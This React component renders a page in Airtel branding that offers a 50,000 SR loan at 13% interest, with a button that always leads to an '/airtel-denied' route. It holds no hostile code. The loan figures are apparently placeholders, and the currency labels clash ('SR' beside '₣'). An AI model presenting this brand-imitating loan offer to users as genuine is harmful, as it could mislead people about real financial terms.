import React from 'react';
import { useNavigate } from 'react-router-dom';

function AirtelLoanLimit() {
  const navigate = useNavigate();

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #DA1C1C; /* Airtel Red */
          position: relative;
        }

        /* MAIN CARD CONTAINER */
        .loan-card-wrapper {
          flex: 1;
          display: flex;
          justify-content: center;
          align-items: flex-start;
          padding: 24px 20px;
        }

        .loan-card {
          background-color: #ffffff;
          width: 100%;
          max-width: 420px;
          border-radius: 24px;
          padding: 32px 24px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        /* BACK BUTTON */
        .back-btn {
          background: none;
          border: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 8px;
          color: #6B7280;
          font-size: 15px;
          font-weight: 500;
          margin-bottom: 24px;
          padding: 0;
        }

        /* TYPOGRAPHY */
        .title {
          font-size: 28px;
          font-weight: 900;
          color: #0F172A;
          margin-bottom: 8px;
        }

        .subtitle {
          font-size: 15px;
          color: #64748B;
          margin-bottom: 24px;
        }

        /* AMOUNT BOX */
        .amount-box {
          background-color: #FEF2F2;
          border: 1px solid #FCA5A5;
          border-radius: 16px;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          margin-bottom: 24px;
        }

        .amount-label {
          font-size: 15px;
          color: #4B5563;
          margin-bottom: 8px;
        }

        .amount-value {
          font-size: 42px;
          font-weight: 900;
          color: #0F172A;
          margin-bottom: 4px;
          letter-spacing: -1px;
        }

        .amount-currency {
          font-size: 18px;
          color: #4B5563;
          font-weight: 500;
        }

        /* DETAIL ROWS */
        .detail-row {
          background-color: #F8FAFC;
          border: 1px solid #F1F5F9;
          border-radius: 12px;
          padding: 16px 20px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 12px;
        }

        .detail-label {
          font-size: 15px;
          color: #475569;
          font-weight: 500;
        }

        .detail-value {
          font-size: 15px;
          font-weight: 800;
          color: #0F172A;
        }

        /* BUTTON */
        .continue-btn {
          width: 100%;
          padding: 18px;
          border-radius: 12px;
          border: none;
          background-color: #F87171; /* Soft Coral Red */
          color: #0F172A; /* Dark text for contrast */
          font-size: 16px;
          font-weight: 800;
          cursor: pointer;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 12px;
          margin-top: 12px;
          transition: all 0.2s;
        }

        .continue-btn:active {
          background-color: #EF4444;
        }

        /* FOOTER ICONS */
        .brand-icons-footer {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
          padding: 24px 20px 40px;
        }

        .brand-icon {
          display: flex;
          align-items: center;
          justify-content: center;
        }
      `}</style>

      <div className="loan-card-wrapper">
        <div className="loan-card">
          
          <button className="back-btn" onClick={() => navigate(-1)}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="19" y1="12" x2="5" y2="12" />
              <polyline points="12 19 5 12 12 5" />
            </svg>
            Back
          </button>

          <h1 className="title">Your Loan Limit</h1>
          <p className="subtitle">Here is the amount you can borrow</p>

          {/* AMOUNT BOX */}
          <div className="amount-box">
            <span className="amount-label">Available Loan Amount</span>
            <span className="amount-value">50,000</span>
            <span className="amount-currency">SR</span>
          </div>

          {/* DETAILS */}
          <div className="detail-row">
            <span className="detail-label">Loan Term</span>
            <span className="detail-value">12 months</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Interest Rate</span>
            <span className="detail-value">13%</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Processing Fee</span>
            <span className="detail-value">Free</span>
          </div>

          {/* ACTION BUTTON */}
          <button className="continue-btn" onClick={() => navigate('/airtel-denied')}>
            Continue to Get Loan
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>

        </div>
      </div>

      {/* BRAND ICONS FOOTER */}
      <div className="brand-icons-footer">
        {/* Icon 1: Airtel Phone */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
          </div>
        </div>
        
        {/* Icon 2: Lock */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
          </div>
        </div>

        {/* Icon 3: Airtel Money */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
          </div>
        </div>

        {/* Icon 4: Currency Symbol */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AirtelLoanLimit;